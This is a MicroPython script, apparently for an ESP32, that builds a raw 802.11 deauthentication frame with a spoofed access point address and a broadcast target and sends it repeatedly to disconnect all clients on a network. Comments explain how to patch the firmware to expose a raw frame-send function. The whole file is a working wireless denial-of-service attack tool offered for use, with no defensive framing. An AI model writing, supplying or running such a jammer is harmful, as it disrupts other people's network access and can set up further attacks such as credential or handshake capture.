import network
import time

# NOTE: Stock MicroPython does not have a built-in method to send raw 802.11 frames.
# To use this script, you must compile a custom MicroPython firmware against the 
# patched ESP-IDF (using Method 2) and expose the `esp_wifi_80211_tx` function 
# to MicroPython, for example, as `wlan.send_raw(buffer)`.

TARGET_CHANNEL = 1

# Target AP and Client MAC addresses
# Use b'\xff\xff\xff\xff\xff\xff' for broadcast (disconnect all clients)
target_mac = b'\xff\xff\xff\xff\xff\xff' 
ap_mac     = b'\x11\x22\x33\x44\x55\x66' # Replace with actual Access Point MAC

# Construct the raw deauthentication frame
frame = bytearray(
    b'\xc0\x00' +       # Frame Control: Deauth subtype (0xC0)
    b'\x00\x00' +       # Duration
    target_mac +        # Destination MAC (Receiver)
    ap_mac +            # Source MAC (Transmitter)
    ap_mac +            # BSSID
    b'\x00\x00' +       # Sequence number
    b'\x07\x00'         # Reason Code: 7
)

def setup():
    # Initialize the WLAN interface in Station mode
    wlan = network.WLAN(network.STA_IF)
    wlan.active(True)
    wlan.disconnect()
    
    # Set the channel (must match the AP's channel)
    wlan.config(channel=TARGET_CHANNEL)
    
    print(f"WiFi initialized on channel {TARGET_CHANNEL}. Ready to send frames.")
    return wlan

def loop(wlan):
    print("Sending deauth frames... (Press Ctrl+C to stop)")
    try:
        while True:
            # IMPORTANT: wlan.send_raw() is a hypothetical custom C-binding. 
            # You need to implement this in your custom MicroPython firmware 
            # to wrap the esp_wifi_80211_tx() C function.
            if hasattr(wlan, 'send_raw'):
                wlan.send_raw(frame)
            else:
                print("Error: wlan.send_raw() not found. A custom MicroPython C-module is required.")
                break
                
            time.sleep(0.1) # 10 frames per second
    except KeyboardInterrupt:
        print("\nStopped.")

if __name__ == "__main__":
    wlan_if = setup()
    loop(wlan_if)
